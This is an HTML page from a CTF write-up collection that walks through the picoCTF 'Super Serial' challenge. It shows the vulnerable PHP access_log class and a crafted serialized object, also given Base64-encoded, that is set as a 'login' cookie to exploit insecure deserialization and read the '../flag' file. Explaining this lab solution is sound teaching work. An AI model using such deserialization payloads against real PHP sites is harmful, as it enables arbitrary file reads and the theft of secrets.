<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Web Exploitation – Easy</title>
  <link rel="stylesheet" href="../css/writeup.css">

</head>

<body>
  <div class="writeup-layout">

    <!-- ===== SIDEBAR ===== -->
    <aside class="sidebar">
      <h2>Web Exploitation</h2>
      <h3><a href="../WebExDesc.html">Web Exploitation Overview</a>
</h3>
      <details closed>
  <summary>Easy Challenges</summary>
  <ul>
    <li><a href="../Easy/Crack_the_Gate_1.html">Crack the Gate 1</a></li>
    <li><a href="coming_soon.html">SSTI1</a></li>
    <li><a href="coming_soon.html">n0s4n1ty 1</a></li>
    <li><a href="../Easy/Cookie_Monster.html">Cookie Monster Secret Recipe</a></li>
    <li><a href="../Easy/Web_Decoder.html">WebDecode</a></li>
    <li><a href="../Easy/Unminify.html">Unminify</a></li>
    <li><a href="../Easy/introtoburpsuite.html">IntroToBurp</a></li>
    <li><a href="../Easy/Bookmarklet.html">Bookmarklet</a></li>
    <li><a href="../Easy/Local_Authority.html">Local Authority</a></li>
    <li><a href="../Easy/Inspect_HTML.html">Inspect HTML</a></li>
    <li><a href="../Easy/Includes.html">Includes</a></li>
    <li><a href="../Easy/Cookie.html">Cookies</a></li>
    <li><a href="../Easy/Scavenger_Hunt.html">Scavenger Hunt</a></li>
    <li><a href="../Easy/Get_aHead.html">GET aHEAD</a></li>
    <li><a href="../Easy/dont_use_client_side.html">dont-use-client-side</a></li>
    <li><a href="../Easy/logon.html">logon</a></li>
    <li><a href="../Easy/Insp3ct0r.html">Insp3ct0r</a></li>
    <li><a href="../Easy/where_are_the_robots.html">where are the robots</a></li>
  </ul>
</details>

    <details open>
  <summary>Medium Challenges</summary>
  <ul>
    <li><a href="Crack_the_Gate_2.html">Crack the Gate 2</a></li>
    <li><a href="">byp4ss3d</a></li>
    <li><a href="">Pachinko</a></li>
    <li><a href="">SSTI 2</a></li>
    <li><a href="3v@l.html">3v@l</a></li>
    <li><a href="">WebSockFish</a></li>
    <li><a href="">ApritiSesamo</a></li>
    <li><a href="">Trickster</a></li>
    <li><a href="No_SQL_Injection.html">No Sql Injection</a></li>
    <li><a href="">SOAP</a></li>
    <li><a href="More_SQLi.html">More SQLi</a></li>
    <li><a href="MatchTheRegex.html">MatchTheRegex</a></li>
    <li><a href="">Java Code Analysis!?!</a></li>
    <li><a href="">findme</a></li>
    <li><a href="">SQLiLite</a></li>
    <li><a href="">SQL Direct</a></li>
    <li><a href="Secrets.html">Secrets</a></li>
    <li><a href="">Search Source</a></li>
    <li><a href="Roboto_Sans.html">Roboto Sans</a></li>
    <li><a href="Power_Cookie.html">Power Cookie</a></li>
    <li><a href="Forbidden_Paths.html">Forbidden Paths</a></li>
    <li><a href="">JAuth</a></li>
    <li><a href="">caas</a></li>
    <li><a href="">login</a></li>
    <li><a href="SuperSerial.html">Super Serial</a></li>
    <li><a href="">Most Cookies</a></li>
    <li><a href="">Web Gauntlet 2</a></li>
    <li><a href="">Some Assembly Required 1</a></li>
    <li><a href="">Who are you?</a></li>
    <li><a href="">Some Assembly Required 2</a></li>
    <li><a href="">Web Gauntlet 3</a></li>
    <li><a href="">More Cookies</a></li>
    <li><a href="">It is my Birthday</a></li>
    <li><a href="">Startup Company</a></li>
    <li><a href="">Web Gauntlet</a></li>
    <li><a href="Irish-Name-Repo_1.html">Irish-Name-Repo 1</a></li>
    <li><a href="Irish-Name-Repo_2.html">Irish-Name-Repo 2</a></li>
    <li><a href="">Irish-Name-Repo 3</a></li>
    <li><a href="">Client-side-again</a></li>
    <li><a href="">picobrowser</a></li>
  </ul>
</details>

    <details closed>
  <summary>Hard Challenges</summary>
  <ul>
    <li><a href="">secure-email-service</a></li>
    <li><a href="">Pachinko Revisited</a></li>
    <li><a href="">elements</a></li>
    <li><a href="">msfroggenerator2</a></li>
    <li><a href="">cancri-sp</a></li>
    <li><a href="">noted</a></li>
    <li><a href="">Live Art</a></li>
    <li><a href="">notepad</a></li>
    <li><a href="">Bithug</a></li>
    <li><a href="">X marks the spot</a></li>
    <li><a href="">Some Assembly Required 3</a></li>
    <li><a href="">Some Assembly Required 4</a></li>
    <li><a href="">Java Script Kiddie</a></li>
    <li><a href="">Java Script Kiddie 2</a></li>
  </ul>
</details>

      <a class="back-home" href="../../index.html">← Back to Index</a>
    </aside>

    <!-- ===== CONTENT ===== -->
    <main class="content">
      <section id="challenge1">
        <h1>Super Serial (Medium)</h1>
        <ul>
          <li>Challenge Link: https://play.picoctf.org/practice/challenge/180?bookmarked=0&category=1&difficulty=2&page=3&solved=0</li>
          <li>Challenge Description: Try to recover the flag stored on this website</li>
        </ul>
      </section>

      <section>
        <h1>Solution</h1>
         <p>Let's first check the robots.txt file, there is a hidden admin.phps file so that is where we will be checking next.</p>
        <img src="../Images/Super Serial/robots.txt.jpg" alt="robots.txt">
        <p>But admin.phps does not exist, however, the good thing is that now we know we can check the page source of php files. So let's check the index.phps file.</p>
        <img src="../Images/Super Serial/admin.phps.jpg" alt="admin.phps">
        <p>Only two notable files stand out which are the cookie.php and authentication.php, let's check their page source.</p>
        <img src="../Images/Super Serial/index.phps.jpg" alt="index.phps">
        <p>The authentication.php is the backend used to log you in and cookie.php is managing your cookies upon logging in. If you scroll down in cookie.phps, you can see that there is an unserialization process going on. Serialization is the process of converting any storable value (including objects and arrays) into a flat string representation. And unserailization convert a serialized string representation of data back into its original PHP value or data structure, such as an array or object.</p>
        <img src="../Images/Super Serial/authentication.phps.jpg" alt="authentication.phps">
        <img src="../Images/Super Serial/cookie.phps.jpg" alt="cookie.phps">
        <p>In authentication.phps, this part of the source code stands out:</p>
        <pre>
&lt;?php

class access_log
{
	public $log_file;

	function __construct($lf) {
		$this-&gt;log_file = $lf;
	}

	function __toString() {
		return $this-&gt;read_log();
	}

	function append_to_log($data) {
		file_put_contents($this-&gt;log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this-&gt;log_file);
	}
}
        </pre>
        <p>This creates an object called access_log, which has a function called __toString() which calls a function called read_log() and read_log() gets the file contents of log_file.
        <br><br>So we need to create an exploit by creating a login cookie in Base64 to then put it in the system to decode it and get our flag.
        PHP Serialization follows the same format:</p>
        <pre>O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}</pre>
        <pre>
O --&gt; means “Object”
:10:"access_log" --&gt; 10 --&gt; the length of the class name (number of characters), "access_log" --&gt; the class name
:1: --&gt; This says the object has 1 property.
Everything inside {} describes the object’s fields (properties).
s:8:"log_file"; --&gt; s --&gt; string, 8 --&gt; length of the string, "log_file" --&gt; property name
s:7:"../flag"; --&gt; s --&gt; string, 7 --&gt; length of the string, "../flag" --&gt; the value assigned to log_file

We are essentially making a PHP object of class access_log with one property called log_file, whose value is "../flag".
        </pre>
        <p>Using a Base64 encoder, we turn:</p>
        <pre>O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";} to TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9</pre>
        <p>Then if we go to the authentication.php page since that is where our admin authentication happens, if we create a new cookie called 'login' and use the Base64 as our value and we refresh our page, we get our flag.</p>
        <img src="../Images/Super Serial/newcookie.jpg" alt="newcookie">

      </section>

      <section>
        <h1>Sources</h1>
        <ul>
          <li><a href="https://gchq.github.io/CyberChef/">CyberChef</a></li>
        </ul>
      </section>

    </main>
  </div>
</body>
</html>
